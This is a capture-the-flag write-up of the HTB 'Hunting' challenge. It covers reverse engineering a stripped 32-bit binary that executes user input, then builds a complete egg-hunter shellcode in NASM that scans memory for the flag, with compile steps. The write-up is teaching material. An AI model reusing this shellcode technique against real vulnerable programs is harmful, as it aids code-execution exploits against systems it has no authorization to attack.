# Binary analysis 1 : Egg hunter exploit (Hunting write-up HTB)
For the little history, it's been some time that I've haven't really explored new binary analysis methods. So to test my skills in binary analysis I began trying some HTB challenges. The one that we will be exploring here is Hunting.

---

## Information gathering

### Enumerating binary properties
Let's start by using the file command :
```bash
$ file hunting 
hunting: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=801f10407444c1390cae5755d9e952f3feadf3eb, for GNU/Linux 3.2.0, stripped
```

Let's explore what all of this means ðŸ‘‰ :

- ELF 32-bit : means that the binary is in ELF format and it's compiled in 32-bit.
- LSB PIE executable : LSB (for least significant byte, meaning that the numbers are ordered in memory with their least significant byte first). PIE (for position-independent executable) means that the binary is compiled with position-independent code (PIC) to take into account security features surch as address-space layout randomization (ASLR). In a sense, the PLT looks different in position-dependent binaries that PIE ones.
- version 1 (SYSV): Using the System V ABI related to the `e_ident[EI_OSABI]` field in the ELF header set to 0.
- dynamically linked interpreter `/lib/ld-linux.so.2``: Means that it uses a shared library.
- Stripped: And finally, the binary is stripped, which means that we will not have that many symbols left.


let's read the symbols by running `readelf` for example:
```bash
$ readelf --syms hunting 

Symbol table '.dynsym' contains 20 entries:
   Num:    Value  Size Type    Bind   Vis      Ndx Name
     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND

    19: 00002004     4 OBJECT  GLOBAL DEFAULT   18 _IO_stdin_used
```
which only gives use the symbols present on the dynamic symbol table dynsym.

### Exploring the dependencies and running the binary
Ok, well when we try to run this what we get is:
```bash
kali@kali:~/Documents/fuzzing/binary_analysis/Hunting/pwn_hunting$ ./hunting 
test
Segmentation fault
```
The least we could said is that we don't get that far. let's try looking at the dependencies using ldd:
```bash
$ ldd hunting 
        linux-gate.so.1 (0xf7eed000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7c00000)
        /lib/ld-linux.so.2 (0xf7eef000)
```

Hmm Hmm well well well, still nothing interesting.

### Running strace
We want to know the behavior of Hunting just before it exits. By calling strace we will have an overview of what our program is doing with system calls.

Let's run strace :

```bash
$ strace ./hunting test

```

We have multiple interesting information here, beginning from the bottom:

- a read syscall into stdin for 60 characters. We know that we have a working boundary of 60 bytes.
- this same address is pushed to the Virtual Address Space (VAS) using mmap.
- We also have a call to the alarm syscall with 10 seconds which is conform to the time that takes before the binary exits when we don't put anything.

### Running strings
when running strings on the binary we can see a dummy flag inside :
```bash
$ strings hunting
tdH 
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
strcpy
[...]
[...]
prctl(PR_SET_NO_NEW_PRIVS)
prctl(PR_SET_SECCOMP)

```

## Reversing the binary
After trying gdb and other bullshit stuff to make it like I'm trying things, let's open IDA *(IDA Free of course, I'm not that rich)* because at least I can differentiate the functions with IDA.

First things first (and because it's a stripped binary) let's find the main function. One way to do so is by starting from the `_start` function. An **ELF binary** has the entry point pointing to this function. Let's see this quickly. here we have our `_start` function:

![start function](/binary_analysis_1/resources/b047cfe5dc4c4107885f2487e200b5dd.png)

Before calling **`__libc_start_main`**, there is a push instruction that to the DS (Data Segment) register. The address used points to the main function and we can directly follow it to find it.

So we can go ahead and rename it and we find the following function:

![Main function](/binary_analysis_1/resources/reverse_hunting.png)

That gives us two sections to look at.

### First section

![main function first section](/binary_analysis_1/resources/section_1.png)

#### get_addr_random function
From the first section we can see a call to a weird function, this function does indeed what it was renamed.

Let's break it into 2 part.

- first part of the get_addr_random function:
![get_addr_random part 1](/binary_analysis_1/resources/get_addr_random_part1.png)

In the screenshot above, there is a load to `/dev/urandom` which is the kernel random number source device. Basically it's the entropy pool where we are going to get our random numbers. The syscalls following, `_open _read _close`, open the device file and extract the seed from urandom that will be used with `_srand`. An initialization to 0 is made for the value of `[ebp+var_C]` with the `mov` instruction. And then we have a conditional branch that goes on to the second part.

second part of the `get_addr_random` function:
![get_addr_random part 2](/binary_analysis_1/resources/get_addr_random_part2.png)

The second part is the conditional branch that compares if our precedent value `[ebp+var_C]` is between `5FFFFFFF` and `F7000000` (which means in decimal, 1 610 612 735 and 4 143 972 352... but we actually don't care about these values...).

#### Memory map creation
From the first section above, after running `get_addr_random`, we set the return value. Mostly from the lines after, there is a call to signal with a exit signal, and a call to alarm initialized at 10 seconds.

And then we can see a call to mmap (for memory mapper) with our result from `get_addr_random` and a bunch of options.

The memory mapped in this case will begin from the address returned by `get_addr_random` and allocate roughly **4096 bytes** (equivalent to the **0x1000** on the second argument).

### The second section

![main function second section](/binary_analysis_1/resources/section_2.png)

I tried to add some comments on this section to explain a bit more in depths what each interesting line does.

On this section, it's interesting to note that we see that our **flag is present**. That we will need to do something to retrieve it. So it's a good first step.

#### What's happening with the flag?
Let's review the first few lines. We load the flag text into the eax register. And we call strcpy to the address used on the precedent `mmap`. So the flag is know the value represented by the previous return of `mmap` (I've renamed it `flag_address`).

Next we call **memset to modify the value of the flag to zeros**, and **we change the `flag_address` to 0**. *I think the idea behind all this wiggly stuff is to not be able to access it any other way*.

#### Rest of the section
On the rest of the section, we allocate another memory with mmap (this one initialized with 0 to indicate anywhere in memory), and we take that return address to use it on our read syscall that only takes **60 characters**. When we run the binary, that the read that takes our input.

A last thing to note, we have a `mov eax, [ebp+var_14]` followed by a `call eax`. So basically, we execute any thing that read got, *hence our seg fault everytime we enter random stuff ;)*.

### Summary : what's the plan?
Let's summarize the points that we have.

From the first section:
- *We have 10 seconds until the program exits.*
- *The address that points to the flag is between 5FFFFFFF and F7000000.*
- *We can look at a whole page (4096 bits) at a time as it is allocated that way.*

From the second section:
- *The flag is retrieved and put on the address allocated before.*
- *The flag is removed so that we can't access it any other way.*
- *We can't put at most 60 characters.*
- *What we put in is executed.*

So to read the flag, we have to find that address pointing to it. So we got to see if each address on the interval `5FFFFFFF` and `F7000000`, contains the flag (we know at least that it begin by `HTB{`). So we have **60 characters and 10 seconds** to put an algorithm **to search the virtual memory space to look if it contains the characters `HTB{` and if that's the case, print it**.

--- 

## Extracting the flag
### Knowing what the F*ck to do next
We know from our analysis that the flag is somewhere on memory. We just have to find a way to get to it. There is multiple types of shellcodes (you can peek at the different types [here](https://security.packt.com/how-attackers-use-shellcodes-to-exploit-a-vulnerable-system/)). The one that is the most promising (Especially because it has the name of the challenge in it...) is the egg hunter shellcode.

Some explanations are in order. The EggHunter technique is used when not enough space is available for inserting a shellcode. In ***stack-based buffer overflows***, memory is relatively static. So, the objective is to place an "egg" in memory, and place an initial stage shellcode that will search for the final stage (and that on the whole memory range, which includes stack, heap and everything). that search is done using a unique tag or egg that was prefixed with the larger payload (aka the final stage).

From Skape's paper, the idea is to search for a process'VAS (Virtual Address Space).

> When having a virtual memory, each process has it's own virtual address space, mapped to the physical memory by the operating system.

One thing that mostly important is to have a state that makes it possible to put a large payload somewhere else in the address space of the process. Weirdly enough, we search for a tag placed by the large payload that had been loaded into the VAS. In our hunter challenge, the tag is the begining of our flag or more precisely the keyword `HTB{`. One specificity of the tag is that it must be unique. Otherwise, it could be mixed with another memory space that is not the one we are looking for.

> According to skape's paper, it is precised that the egg size should be 8 bytes. It is explained that the egg hunting implementation algorithms tend to use a 4-bytes key. So, we might run into the egg hunter instead of the buffer we are looking for.

### Implementing the EggHunter
From what we have saw on the reversing section, we have an available 60 character space. 
according the skape's paper, there is limited ways to search for a process' VAS on linux (the egg hunter exploitation technique works also on windows).

The first thing to note, is ***the use of a system call to serve as an error handler*** (it is precised that there is another approach that consists on registering a segmentation fault handler to prevent the program from crashing, but *using syscalls is easier and less intrusive*).

### Assembly code

```asm
global _start


section .text



; the first thing that must be done is to 
; move the "egg" in ESI
; ESI is the offset register 
_start:
    mov edi, dword  0x7b425448  ; egg to search for representing HTB{ (little endian)
    mov edx, 0x5FFFFFFF         ; setting start search address

; next page alignment 
next_page: 
    or dx, 0xfff                ; dx=4095; does a page increment

next_addr:
    inc edx                     ; edx=4096
    pusha                       ; push of all the current general purposes registers onto the stack to be preserved across the system call
    lea ebx, [edx+0x4]          ; ebx contains the first argument of the system call. ebx will point to the pathname pointer, the + 4 allows 8 bytes of contiguous memory to be validated in a single swoop
    mov al, 0x21                ; Access syscall number 
    int 0x80                    ; call to access the syscall
    cmp al, 0xf2                ; checking if it returns EFAULT
    popa                        ; restore the registers previously pushed
    jz next_page                ; if access returns EFAULT skip to the next page
    cmp [edx], edi              ; initializing edx if it contains our egg HTB{
    jnz next_addr            ; if our egg isn't in it, we skip to the next address
    mov ecx, edx                ; if we find our egg we put it in ecx for write argument below (arg 2)
    push 0x24                   ; length of the flag (arg 3)
    pop edx                     
    push 0x1                    ; 1 representing stdout (arg 1)
    pop ebx
    mov al, 0x4                 ; write sycall number in x32 bytes
    int 0x80                    ; call to write via interrupt to print the flag
```
Some explanations are in order:

We first begin by writing the pattern of the and egg to search for representing `HTB{` (reversed because of little endian so `{BTH`) and we put it on the EDI register to be used after. As we know that the flag is set in an address located by the `get_random_addr` function, we can set the start address at `0x5FFFFFFF` and move forward from there. 

We then initialize two functions, the first one is `next_page` and the second `next_addr`. 

The first function, `next_page` does a page increment. Skape explains in his paper that if the `access` syscall returns a `EFAULT` error, it must by an invalid memory address. And because of the 4KB paging in memory, it assumes that all addresses inside the page are invalid. 

The second, `next_addr`, calls for `access` syscall, if it returns an error, we move to the next page, if not we check if the egg is in the address searched. 

If the egg is not in the address we move to the next, else we print everything we the length of the flag. 

### preparing the exploit

Let's begin by compiling this code into an object file :
```bash
$ nasm -f elf32 -o egg_hunting.o egg_hunting.asm
```

We can view the assembly of the file by using objdump, 
```bash

$ objdump -d egg_hunter_shellcode.o

egg_hunter_shellcode.o:     file format elf32-i386

Disassembly of section .text:

    23:   6a 24                   push   $0x24
    25:   5a                      pop    %edx
    26:   6a 01                   push   $0x1
    28:   5b                      pop    %ebx
    29:   b0 04                   mov    $0x4,%al
    2b:   cd 80                   int    $0x80
```
